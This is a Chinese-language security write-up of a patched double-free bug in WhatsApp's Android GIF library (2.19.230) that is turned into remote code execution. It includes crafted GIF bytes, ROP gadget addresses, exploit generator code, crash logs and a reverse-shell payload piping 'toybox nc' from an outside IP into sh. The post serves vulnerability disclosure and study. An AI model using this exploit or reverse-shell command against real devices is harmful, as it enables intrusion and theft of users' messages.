#  WhatsApp中的双重释放漏洞如何转变为RCE   
3bytes  3072   2024-07-27 11:00  
  
## 演示  
  
  
步骤如下：  
- 0:16 攻击者通过任意渠道向用户发送GIF文件  
  
- 其中之一可以是通过WhatsApp发送文档（即按下回形针按钮并选择文档以发送损坏的GIF）  
  
- 如果攻击者在用户的联系人列表中（即朋友），损坏的GIF会在没有任何用户交互的情况下自动下载。  
  
- 0:24 用户想要向他的WhatsApp朋友发送媒体文件。所以用户按下回形针按钮并打开WhatsApp画廊以选择要发送的媒体文件。  
  
- 请注意，用户不需要发送任何东西，因为仅打开WhatsApp画廊就会触发漏洞。按下WhatsApp画廊后无需额外操作。  
  
- 0:30 由于WhatsApp显示每个媒体的预览（包括收到的GIF文件），它会触发双重释放漏洞和我们的RCE利用。  
  
## libpl_droidsonroids_gif中的DDGifSlurp双重释放漏洞  
  
当WhatsApp用户在WhatsApp中打开画廊视图以发送媒体文件时，WhatsApp会使用一个名为libpl_droidsonroids_gif.so的本地库解析它，以生成GIF文件的预览。libpl_droidsonroids_gif.so是一个开源库，其源代码可在https://github.com/koral–/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c找到。  
  
GIF文件包含多个编码帧。为了存储解码后的帧，使用名为rasterBits的缓冲区。如果所有帧的大小相同，则重用rasterBits来存储解码后的帧，而无需重新分配。然而，如果满足以下三种条件之一，rasterBits将会重新分配：  
- width * height > originalWidth * originalHeight  
  
- width - originalWidth > 0  
  
- height - originalHeight > 0  
  
重新分配是free和malloc的组合。如果重新分配的大小为0，则只是一个free。假设我们有一个包含3帧的GIF文件，帧的大小为100、0和0。  
- 在第一次重新分配后，我们得到info->rasterBits缓冲区大小为100。  
  
- 在第二次重新分配0时，info->rasterBits缓冲区被释放。  
  
- 在第三次重新分配0时，info->rasterBits再次被释放。  
  
这会导致双重释放漏洞。触发位置可以在decoding.c中找到：  
```
int_fast32_t widthOverflow = gifFilePtr->Image.Width - info->originalWidth;
int_fast32_t heightOverflow = gifFilePtr->Image.Height - info->originalHeight;
const uint_fast32_t newRasterSize =
        gifFilePtr->Image.Width * gifFilePtr->Image.Height;
if (newRasterSize > info->rasterSize || widthOverflow > 0 ||
    heightOverflow > 0) {
    void *tmpRasterBits = reallocarray(info->rasterBits, newRasterSize,     <<-- double-free here
                                       sizeof(GifPixelType));
    if (tmpRasterBits == NULL) {
        gifFilePtr->Error = D_GIF_ERR_NOT_ENOUGH_MEM;
        break;
    }
    info->rasterBits = tmpRasterBits;
    info->rasterSize = newRasterSize;
}

```  
  
在Android中，对大小为N的内存进行双重释放会导致两个后续的大小为N的内存分配返回相同的地址。  
```
(lldb) expr int $foo = (int) malloc(112)
(lldb) p/x $foo
(int) $14 = 0xd379b250

(lldb) p (int)free($foo)
(int) $15 = 0

(lldb) p (int)free($foo)
(int) $16 = 0

(lldb) p/x (int)malloc(12)
(int) $17 = 0xd200c350

(lldb) p/x (int)malloc(96)
(int) $18 = 0xe272afc0

(lldb) p/x (int)malloc(180)
(int) $19 = 0xd37c30c0

(lldb) p/x (int)malloc(112)
(int) $20 = 0xd379b250

(lldb) p/x (int)malloc(112)
(int) $21 = 0xd379b250

```  
  
在上面的代码片段中，变量  
被释放了两次。结果是接下来的两个分配（20和$21）返回了相同的地址。  
  
现在查看gif.h中的结构体GifInfo。  
```
struct GifInfo {
    void (*destructor)(GifInfo *, JNIEnv *);  <<-- there's a function pointer here
    GifFileType *gifFilePtr;
    GifWord originalWidth, originalHeight;
    uint_fast16_t sampleSize;
    long long lastFrameRemainder;
    long long nextStartTime;
    uint_fast32_t currentIndex;
    GraphicsControlBlock *controlBlock;
    argb *backupPtr;
    long long startPos;
    unsigned char *rasterBits;
    uint_fast32_t rasterSize;
    char *comment;
    uint_fast16_t loopCount;
    uint_fast16_t currentLoop;
    RewindFunc rewindFunction;   <<-- there's another function pointer here
    jfloat speedFactor;
    uint32_t stride;
    jlong sourceLength;
    bool isOpaque;
    void *frameBufferDescriptor;
};

```  
  
我们随后构造了一个GIF文件，包含三个帧，大小如下：  
- sizeof(GifInfo)  
  
- 0  
  
- 0  
  
当WhatsApp画廊被打开时，所述GIF文件会触发双重释放漏洞，导致rasterBits缓冲区的大小为sizeof(GifInfo)。有趣的是，在WhatsApp画廊中，一个GIF文件会被解析两次。当该GIF文件再次被解析时，会创建另一个GifInfo对象。由于Android中的双重释放行为，GifInfo info对象和info->rasterBits将指向相同的地址。DDGifSlurp()将把第一个帧解码到info->rasterBits缓冲区，从而覆盖info及其rewindFunction()，该函数会在DDGifSlurp()函数的末尾被调用。  
## 控制PC寄存器  
  
我们需要构造的GIF文件如下：  
```
47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC 
FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 F0 CE 57 2B 6F EE FF FF 2C 00 00 
00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00 
18 00 0A 00 0F 00 01 00 00 3B

```  
  
它包含四帧：  
- 帧 1:  
```
2C 00 00 00 00 08 00 15 00 00 08 9C 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
F0 CE 57 2B 6F EE FF FF

```  
  
  
- 帧 2:  
```
2C 00 00 00 00 1C 0F 00 00 00 00

```  
  
  
- 帧 3:  
```
2C 00 00 00 00 1C 0F 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00

```  
  
  
- 帧 4:  
```
2C 00 00 00 00 18 00 0A 00 0F 00 01 00 00

```  
  
当打开WhatsApp画廊时发生如下情况：  
  
- 第一次解析：  
  
- 不重要，它仅用于使此GIF文件有效  
  
- info->rasterBits = reallocarray(info->rasterBits, 0x0*0xf1c, 1);  
  
- info->rasterBits = reallocarray(info->rasterBits, 0x0*0xf1c, 1);  
  
- info->rasterBits = reallocarray(info->rasterBits, 0x8*0x15, 1);  
  
- GifInfo *info = malloc(168);  
  
- 初始化：  
  
- 帧 1：  
  
- 帧 2：  
  
- 帧 3：  
  
- 帧 4：  
  
- 第二次解析：  
  
- info->rewindFunction(info);  
  
- 不重要  
  
- info->rasterBits = reallocarray(info->rasterBits, 0x8*0x15, 1);  
  
- GifInfo *info = malloc(168);  
  
- 初始化：  
  
- 帧 1：  
  
- 帧 2、3、4：  
  
- 结束：  
  
由于第一次解析中发生的双重释放，info和info->rasterBits现在指向相同的位置。通过精心设计的第一个帧，我们可以控制rewindFunction和PC寄存器，当调用info->rewindFunction(info);时。请注意，所有帧均为LZW编码。我们必须使用LZW编码器对帧进行编码。上述GIF会触发如下崩溃：  
```
--------- beginning of crash
10-02 11:09:38.460 17928 18059 F libc    : Fatal signal 6 (SIGABRT), code -6 in tid 18059 (image-loader), pid 17928 (com.whatsapp)
10-02 11:09:38.467  1027  1027 D QCOM PowerHAL: LAUNCH HINT: OFF
10-02 11:09:38.494 18071 18071 I crash_dump64: obtaining output fd from tombstoned, type: kDebuggerdTombstone
10-02 11:09:38.495  1127  1127 I /system/bin/tombstoned: received crash request for pid 17928
10-02 11:09:38.497 18071 18071 I crash_dump64: performing dump of process 17928 (target tid = 18059)
10-02 11:09:38.497 18071 18071 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
10-02 11:09:38.497 18071 18071 F DEBUG   : Build fingerprint: 'google/taimen/taimen:8.1.0/OPM1.171019.011/4448085:user/release-keys'
10-02 11:09:38.497 18071 18071 F DEBUG   : Revision: 'rev_10'
10-02 11:09:38.497 18071 18071 F DEBUG   : ABI: 'arm64'
10-02 11:09:38.497 18071 18071 F DEBUG   : pid: 17928, tid: 18059, name: image-loader  >>> com.whatsapp <<<
10-02 11:09:38.497 18071 18071 F DEBUG   : signal 6 (SIGABRT), code -6 (SI_TKILL), fault addr --------
10-02 11:09:38.497 18071 18071 F DEBUG   :     x0   0000000000000000  x1   000000000000468b  x2   0000000000000006  x3   0000000000000008
10-02 11:09:38.497 18071 18071 F DEBUG   :     x4   0000000000000000  x5   0000000000000000  x6   0000000000000000  x7   7f7f7f7f7f7f7f7f
10-02 11:09:38.497 18071 18071 F DEBUG   :     x8   0000000000000083  x9   0000000010000000  x10  0000007da3c81cc0  x11  0000000000000001
10-02 11:09:38.497 18071 18071 F DEBUG   :     x12  0000007da3c81be8  x13  ffffffffffffffff  x14  ff00000000000000  x15  ffffffffffffffff
10-02 11:09:38.497 18071 18071 F DEBUG   :     x16  00000055b111efa8  x17  0000007e2bb3452c  x18  0000007d8ba9bad8  x19  0000000000004608
10-02 11:09:38.497 18071 18071 F DEBUG   :     x20  000000000000468b  x21  0000000000000083  x22  0000007da3c81e48  x23  00000055b111f3f0
10-02 11:09:38.497 18071 18071 F DEBUG   :     x24  0000000000000040  x25  0000007d8bbff588  x26  00000055b1120670  x27  000000000000000b
10-02 11:09:38.497 18071 18071 F DEBUG   :     x28  00000055b111f010  x29  0000007da3c81d00  x30  0000007e2bae9760
10-02 11:09:38.497 18071 18071 F DEBUG   :     sp   0000007da3c81cc0  pc   0000007e2bae9788  pstate 0000000060000000
10-02 11:09:38.499 18071 18071 F DEBUG   :
10-02 11:09:38.499 18071 18071 F DEBUG   : backtrace:
10-02 11:09:38.499 18071 18071 F DEBUG   :     #00 pc 000000000001d788  /system/lib64/libc.so (abort+120)
10-02 11:09:38.499 18071 18071 F DEBUG   :     #01 pc 0000000000002fac  /system/bin/app_process64 (art::SignalChain::Handler(int, siginfo*, void*)+1012)
10-02 11:09:38.499 18071 18071 F DEBUG   :     #02 pc 00000000000004ec  [vdso:0000007e2e4b0000]
10-02 11:09:38.499 18071 18071 F DEBUG   :     #03 pc deadbeeefffffffc  <unknown>

```  
## 处理ASLR和W^X  
  
在控制了PC之后，我们希望实现远程代码执行。在Android中，由于W^X（即堆栈和堆），我们不能在非可执行区域执行代码。在我们的情况下，处理W^X的最简单方法是执行以下命令：  
```
system("toybox nc 192.168.2.72 4444 | sh");

```  
  
为此，我们需要PC指向system()函数在libc.so中的地址，并且X0指向"toybox nc 192.168.2.72 4444 | sh"。这不能直接完成。我们首先需要让PC跳转到一个中间gadget，该gadget将X0设置为指向"toybox nc 192.168.2.72 4444 | sh"并跳转到system()。从info->rewindFunction(info);附近的反汇编代码中，我们可以看到X0和X19都指向info->rasterBits（或info，因为它们都指向相同的位置），而X8实际上是info->rewindFunction。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yH9RwcL1AX7g52SnGKPKUcQticCwo6E4qVDVQGib1Kic3l6swm2RlBGHKObNx9XwCU5shGRMicpib50wIg/640?wx_fmt=png&from=appmsg "")  
  
Disassembly around info->rewindFunction  
  
在libhwui.so中有一个完美满足我们需求的gadget：  
```
ldr x8, [x19, #0x18]
add x0, x19, #0x20
blr x8

```  
  
假设上述gadget的地址是AAAAAAAA，system()函数的地址是BBBBBBBB。在LZW编码之前，rasterBits缓冲区（帧 1）如下所示：  
```
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 4242 4242 4242 4242  ........BBBBBBBB
00000020: 746f 7962 6f78 206e 6320 3139 322e 3136  toybox nc 192.16
00000030: 382e 322e 3732 2034 3434 3420 7c20 7368  8.2.72 4444 | sh
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..

```  
  
在正常的Android系统中，由于所有进程都是从Zygote生成的，即使在ASLR的情况下，我们的地址AAAAAAAA和BBBBBBBB在WhatsApp被杀死并重新启动后也不会改变。然而，它们不能在系统重启后保持不变。为了获得可靠的AAAAAAAA和BBBBBBBB，我们需要一个信息泄露漏洞，该漏洞可以提供libc.so和libhwui.so的基地址。这个漏洞超出了本博客的范围。  
## 综合所有内容  
  
只需编译这个repo中的代码。请注意，system()和gadget的地址必须由信息泄露漏洞提供的实际地址替换（这在本博客中未涵盖）。  
```
    /*
    Gadget g1:
        ldr x8, [x19, #0x18]
        add x0, x19, #0x20
        blr x8
    */
    size_t g1_loc = 0x7cb81f0954;  <<-- replace this
    memcpy(buffer + 128, &g1_loc, 8);

    size_t system_loc = 0x7cb602ce84; <<-- replace this
    memcpy(buffer + 24, &system_loc, 8);

```  
  
运行代码以生成损坏的GIF文件：  
```
notroot@osboxes:~/Desktop/gif$ make
.....
.....
.....
notroot@osboxes:~/Desktop/gif$ ./exploit exploit.gif
buffer = 0x7ffc586cd8b0 size = 266
47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC
FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00
00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08
9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 84 9C 09 B0
C5 07 00 00 00 74 DE E4 11 F3 06 0F 08 37 63 40
C4 C8 21 C3 45 0C 1B 38 5C C8 70 71 43 06 08 1A
34 68 D0 00 C1 07 C4 1C 34 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 F0 CE 57 2B 6F EE FF FF 2C 00 00
00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00
18 00 0A 00 0F 00 01 00 00 3B

```  
  
然后复制exploit.gif文件并通过WhatsApp作为文档发送给另一位WhatsApp用户。请注意，它不能作为媒体文件发送，否则WhatsApp会尝试在发送之前将其转换为MP4。用户接收到恶意GIF文件后，什么也不会发生，直到用户打开WhatsApp Gallery并尝试将媒体文件发送给朋友。  
## 受影响的版本  
  
该漏洞在WhatsApp版本2.19.230中有效。漏洞在WhatsApp版本2.19.244中已正式修补。  
  
该漏洞在Android 8.1和9.0中有效，但在Android 8.0及以下版本中无效。在旧版本的Android中，虽然可以触发双重释放，但由于系统在双重释放后的malloc调用，应用程序会在达到可以控制PC寄存器的点之前崩溃。  
  
请注意，Facebook已通知android-gif-drawable repo的开发者有关此问题。Facebook的修复程序也已合并到原始repo中，见于8月10日的提交。android-gif-drawable版本1.2.18不受双重释放漏洞影响。  
## 攻击向量  
  
通过上述利用，我们可以有两个攻击向量：  
1. **本地权限提升（从用户应用到WhatsApp）**：在Android设备上安装恶意应用。该应用收集zygote库的地址并生成一个恶意GIF文件，导致在WhatsApp上下文中执行代码。这允许恶意软件应用程序窃取WhatsApp沙箱中的文件，包括消息数据库。  
  
1. **远程代码执行**：与具有远程内存信息泄露漏洞（例如浏览器）的应用程序配对，攻击者可以收集zygote库的地址并制作恶意GIF文件，通过WhatsApp将其发送给用户（必须作为附件，而不是通过Gallery Picker作为图像）。一旦用户打开WhatsApp中的Gallery视图（对吧？从未将媒体文件发送给朋友），该GIF文件将在WhatsApp上下文中触发远程Shell。  
  
### 参考资料  
  
[1]  
DoS Wechat with an emoji: https://awakened1712.github.io/hacking/hacking-wechat-dos/  
  
  
